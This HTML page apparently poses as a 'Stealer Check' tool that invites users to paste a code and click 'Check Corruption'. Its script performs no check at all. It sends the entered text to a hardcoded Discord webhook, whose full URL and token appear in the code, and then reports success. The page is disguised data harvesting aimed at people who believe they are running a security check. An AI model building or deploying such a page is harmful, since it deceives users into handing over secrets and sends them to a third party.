<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stealer Info Check</title>
    <!-- Tailwind CSS CDN for easy styling -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Custom styles for the Inter font and overall body */
        body {
            font-family: 'Inter', sans-serif;
            background-color: #1a202c; /* Dark background */
            color: #e2e8f0; /* Light text color */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 1rem; /* Add some padding for smaller screens */
            box-sizing: border-box; /* Include padding in element's total width and height */
        }
    </style>
</head>
<body>
    <div class="bg-gray-800 p-8 rounded-lg shadow-xl w-full max-w-md mx-auto border border-gray-700">
        <h1 class="text-3xl font-bold text-white mb-6 text-center">Stealer Check</h1>

        <!-- Text area for the message -->
        <div class="mb-4">
            <label for="messageInput" class="block text-gray-300 text-sm font-semibold mb-2">Enter Code:</label>
            <textarea
                id="messageInput"
                rows="6"
                class="w-full p-3 bg-gray-700 text-white rounded-md border border-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-500 transition duration-200 ease-in-out resize-y"
                placeholder="Enter Code"
            ></textarea>
        </div>

        <!-- Button to send the message -->
        <button
            id="sendButton"
            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-75 transition duration-300 ease-in-out transform hover:scale-105"
        >
            Check Corruption
        </button>

        <!-- Message box for feedback -->
        <div id="messageBox" class="mt-6 p-3 text-sm text-center rounded-md hidden">
            <!-- Messages will be displayed here -->
        </div>
    </div>

    <script>
        // Get references to the HTML elements
        const messageInput = document.getElementById('messageInput');
        const sendButton = document.getElementById('sendButton');
        const messageBox = document.getElementById('messageBox');

        // Discord webhook URL
        const webhookUrl = 'https://discord.com/api/webhooks/1395524525038501898/NvLWqzSozM0UVmcBWOjPLnFyk8_u0HOv-APeS5kjr6ZwT0kapfpkYuH4b8W7uKBSO7qF';

        /**
         * Displays a message in the message box.
         * @param {string} message - The message to display.
         * @param {boolean} isError - True if it's an error message, false otherwise.
         */
        function showMessageBox(message, isError = false) {
            messageBox.textContent = message;
            messageBox.classList.remove('hidden', 'bg-green-600', 'bg-red-600');
            if (isError) {
                messageBox.classList.add('bg-red-600');
            } else {
                messageBox.classList.add('bg-green-600');
            }
            // Hide the message after 5 seconds
            setTimeout(() => {
                messageBox.classList.add('hidden');
            }, 5000);
        }

        // Add event listener to the send button
        sendButton.addEventListener('click', async () => {
            const message = messageInput.value.trim(); // Get the text and remove leading/trailing whitespace

            // Check if the message is empty
            if (!message) {
                showMessageBox('Please enter a message before sending.', true);
                return; // Stop execution if message is empty
            }

            // Disable the button and show a loading indicator
            sendButton.disabled = true;
            sendButton.textContent = 'Sending...';
            messageBox.classList.add('hidden'); // Hide previous messages

            try {
                // Send the message to the Discord webhook
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ content: message }), // Discord expects a 'content' field
                });

                // Check if the request was successful
                if (response.ok) {
                    showMessageBox('Message sent successfully!');
                    messageInput.value = ''; // Clear the input field on success
                } else {
                    const errorText = await response.text();
                    showMessageBox(`Failed to send message: ${response.status} ${response.statusText}. ${errorText}`, true);
                }
            } catch (error) {
                // Catch network errors or other issues
                showMessageBox(`An error occurred: ${error.message}`, true);
                console.error('Fetch error:', error);
            } finally {
                // Re-enable the button regardless of success or failure
                sendButton.disabled = false;
                sendButton.textContent = 'Send to Discord';
            }
        });
    </script>
</body>
</html>
